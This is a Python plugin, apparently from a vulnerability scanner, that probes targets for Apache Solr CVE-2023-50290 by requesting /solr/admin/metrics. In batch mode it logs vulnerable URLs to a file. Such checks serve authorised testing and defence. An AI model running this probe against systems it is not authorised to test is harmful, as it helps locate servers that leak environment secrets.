# ! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests, urllib3
from pub.com.outprint import OutPrintInfo, OutPrintInfoSuc, OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile

urllib3.disable_warnings()
class Cve_2023_50290:
    def get_url(self, input_url):
        try:
            url = input_url + "/solr/admin/metrics"
            req = requests.get(url, headers=self.headers, proxies=self.proxy, verify=self.ssl)
            if "ADMIN" in req.text and req.status_code == 200:
                if not self.batch:
                    OutPrintInfoSuc("Apache", '目标存在Apache Solr CVE-2023-50290环境变量信息泄漏漏洞')
                    OutPrintInfo("Apache", url)
                else:
                    OutPrintInfoSuc("Apache", f'目标存在环境变量信息泄漏: {url}')
                    OutPutFile("apache_solr_2023_50290.txt", f'目标存在Apache Solr CVE-2023-50290环境变量信息泄漏漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f'目标 {input_url} 不存在Apache Solr CVE-2023-50290环境变量信息泄漏漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Apache", '目标请求出错')
            return False

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Apache", '开始检测Apache Solr CVE-2023-50290环境变量信息泄漏漏洞...')
        self.get_url(url)
        
        if not self.batch:
            OutPrintInfo("Apache", 'Apache Solr CVE-2023-50290环境变量信息泄漏漏洞检测结束')

